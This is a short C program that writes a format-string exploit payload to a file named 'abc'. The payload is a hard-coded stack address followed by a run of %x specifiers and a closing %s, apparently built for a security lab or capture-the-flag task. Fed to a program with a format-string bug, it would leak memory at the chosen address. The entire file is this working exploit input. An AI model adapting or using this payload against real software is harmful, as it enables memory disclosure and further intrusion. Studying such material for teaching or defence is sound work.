#include <stdio.h>
 
int main(int argc, char *argv[]) {
  char buf[70] = "%x\x2c\xd5\xff\xff %x %x %x %x %x %x %x %x %x %x %x %x %s";
  FILE *fp;

  fp = fopen("abc", "w");
  fwrite(buf, 1, 70, fp);

  fclose(fp);
}
